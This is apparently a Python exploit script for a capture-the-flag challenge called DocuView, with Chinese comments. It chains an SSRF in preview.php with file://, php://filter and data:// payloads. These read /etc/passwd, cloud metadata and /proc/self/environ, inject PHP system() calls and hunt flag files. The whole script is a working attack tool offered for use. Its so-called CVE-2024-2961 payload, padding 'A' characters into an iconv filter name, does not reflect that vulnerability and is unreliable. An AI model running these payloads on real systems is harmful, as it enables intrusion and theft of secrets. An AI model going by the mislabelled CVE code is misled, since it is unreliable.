#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DocuView CTF Challenge Exploit
CVE-2024-2961: PHP iconv() Remote Code Execution

This exploit targets the DocuView document preview service which contains
a Server-Side Request Forgery (SSRF) vulnerability that can be chained
with CVE-2024-2961 to achieve Remote Code Execution.

Author: CTF Challenge Designer
Date: 2024-12-19
"""

import requests
import sys
import time
import base64
import urllib.parse
from urllib.parse import quote

class DocuViewExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def banner(self):
        print("\n" + "="*60)
        print("  DocuView CTF Challenge Exploit")
        print("  CVE-2024-2961: PHP iconv() RCE via SSRF")
        print("="*60)
        print(f"Target: {self.target_url}")
        print("="*60 + "\n")
    
    def check_target(self):
        """检查目标是否可访问"""
        try:
            print("[*] Checking target accessibility...")
            response = self.session.get(f"{self.target_url}/index.php", timeout=10)
            if response.status_code == 200 and "DocuView" in response.text:
                print("[+] Target is accessible and appears to be DocuView")
                return True
            else:
                print("[-] Target does not appear to be DocuView or is not accessible")
                return False
        except Exception as e:
            print(f"[-] Error checking target: {e}")
            return False
    
    def test_ssrf(self):
        """测试SSRF漏洞"""
        print("[*] Testing SSRF vulnerability...")
        
        # 测试基本的SSRF
        test_urls = [
            "http://httpbin.org/get",
            "https://httpbin.org/get",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/"
        ]
        
        for test_url in test_urls:
            try:
                data = {
                    'url': test_url,
                    'format': 'text',
                    'quality': 'high',
                    'cache': 'false'
                }
                
                print(f"[*] Testing URL: {test_url}")
                response = self.session.post(
                    f"{self.target_url}/preview.php",
                    data=data,
                    timeout=15
                )
                
                if response.status_code == 200:
                    if "httpbin" in test_url and "origin" in response.text.lower():
                        print("[+] SSRF confirmed - External HTTP requests possible")
                        return True
                    elif "file://" in test_url and ("root:" in response.text or "bin/" in response.text):
                        print("[+] SSRF confirmed - Local file access possible")
                        return True
                    elif "169.254.169.254" in test_url and "meta-data" in response.text:
                        print("[+] SSRF confirmed - Cloud metadata access possible")
                        return True
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] Error testing {test_url}: {e}")
                continue
        
        print("[-] SSRF vulnerability not confirmed with basic tests")
        return False
    
    def generate_cve_payload(self, command):
        """生成CVE-2024-2961利用载荷"""
        # CVE-2024-2961 的核心载荷
        # 这个载荷利用iconv()函数的缓冲区溢出漏洞
        
        # 构造恶意的字符集转换字符串
        charset_exploit = "UTF-8" + "A" * 100  # 触发缓冲区溢出
        
        # 使用php://filter协议包装载荷
        filter_chain = f"php://filter/convert.iconv.{charset_exploit}/resource=data://text/plain,"
        
        # 编码命令
        encoded_command = base64.b64encode(command.encode()).decode()
        
        # 构造完整的载荷
        payload = f"{filter_chain}{encoded_command}"
        
        return payload
    
    def exploit_rce(self, command="id"):
        """利用CVE-2024-2961实现RCE"""
        print(f"[*] Attempting RCE with command: {command}")
        
        # 生成多种不同的载荷
        payloads = [
            # 方法1: 直接的php://filter载荷
            f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php system("{command}"); ?>'.encode()).decode()}",
            
            # 方法2: 使用iconv触发CVE-2024-2961
            self.generate_cve_payload(command),
            
            # 方法3: 组合多个filter
            f"php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php system("{command}"); ?>'.encode()).decode()}",
            
            # 方法4: 使用file协议读取敏感文件
            "file:///flag",
            "file:///root/flag",
            "file:///var/www/html/flag.txt",
            
            # 方法5: 尝试读取环境变量
            "php://filter/convert.base64-encode/resource=/proc/self/environ",
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                print(f"[*] Trying payload {i}/{len(payloads)}...")
                
                data = {
                    'url': payload,
                    'format': 'text',
                    'quality': 'high',
                    'cache': 'false'
                }
                
                response = self.session.post(
                    f"{self.target_url}/preview.php",
                    data=data,
                    timeout=20
                )
                
                if response.status_code == 200:
                    content = response.text
                    
                    # 检查是否包含命令执行结果
                    if any(indicator in content.lower() for indicator in ['uid=', 'gid=', 'groups=']):
                        print(f"[+] RCE successful with payload {i}!")
                        print(f"[+] Command output:\n{content}")
                        return True
                    
                    # 检查是否包含flag
                    if 'flag{' in content.lower() or 'ctf{' in content.lower():
                        print(f"[+] Flag found with payload {i}!")
                        print(f"[+] Flag content:\n{content}")
                        return True
                    
                    # 检查是否包含base64编码的内容
                    if len(content) > 50 and content.replace('\n', '').replace('\r', '').isalnum():
                        try:
                            decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                            if 'flag{' in decoded.lower() or any(indicator in decoded.lower() for indicator in ['uid=', 'root:', 'bin/']):
                                print(f"[+] Base64 encoded content found with payload {i}!")
                                print(f"[+] Decoded content:\n{decoded}")
                                return True
                        except:
                            pass
                    
                    # 如果内容不为空且看起来有意义，显示它
                    if len(content.strip()) > 10:
                        print(f"[*] Payload {i} returned content (length: {len(content)}):")
                        print(content[:200] + ("..." if len(content) > 200 else ""))
                        print()
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] Error with payload {i}: {e}")
                continue
        
        print("[-] RCE attempts failed")
        return False
    
    def try_flag_extraction(self):
        """尝试直接提取flag"""
        print("[*] Attempting direct flag extraction...")
        
        flag_locations = [
            "/flag",
            "/root/flag",
            "/home/flag",
            "/var/www/html/flag",
            "/var/www/html/flag.txt",
            "/tmp/flag",
            "/flag.txt",
            "../flag",
            "../../flag",
            "../../../flag"
        ]
        
        for location in flag_locations:
            try:
                print(f"[*] Trying flag location: {location}")
                
                # 尝试多种协议
                for protocol in ["file://", "php://filter/convert.base64-encode/resource="]:
                    payload = f"{protocol}{location}"
                    
                    data = {
                        'url': payload,
                        'format': 'text',
                        'quality': 'high',
                        'cache': 'false'
                    }
                    
                    response = self.session.post(
                        f"{self.target_url}/preview.php",
                        data=data,
                        timeout=10
                    )
                    
                    if response.status_code == 200 and response.text.strip():
                        content = response.text.strip()
                        
                        # 检查是否是flag
                        if 'flag{' in content.lower():
                            print(f"[+] Flag found at {location}!")
                            print(f"[+] Flag: {content}")
                            return True
                        
                        # 检查是否是base64编码的flag
                        if protocol.startswith("php://filter"):
                            try:
                                decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                                if 'flag{' in decoded.lower():
                                    print(f"[+] Base64 encoded flag found at {location}!")
                                    print(f"[+] Flag: {decoded}")
                                    return True
                            except:
                                pass
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] Error checking {location}: {e}")
                continue
        
        return False
    
    def run_exploit(self):
        """运行完整的利用流程"""
        self.banner()
        
        # 检查目标
        if not self.check_target():
            return False
        
        # 测试SSRF
        if not self.test_ssrf():
            print("[!] SSRF not confirmed, but continuing with exploitation attempts...")
        
        # 尝试直接提取flag
        if self.try_flag_extraction():
            return True
        
        # 尝试RCE
        commands = ["id", "whoami", "pwd", "ls -la", "cat /flag", "cat /root/flag"]
        for cmd in commands:
            if self.exploit_rce(cmd):
                return True
        
        print("[-] All exploitation attempts failed")
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exp_docuview.py <target_url>")
        print("Example: python3 exp_docuview.py http://localhost:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    exploit = DocuViewExploit(target_url)
    success = exploit.run_exploit()
    
    if success:
        print("\n[+] Exploitation successful!")
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()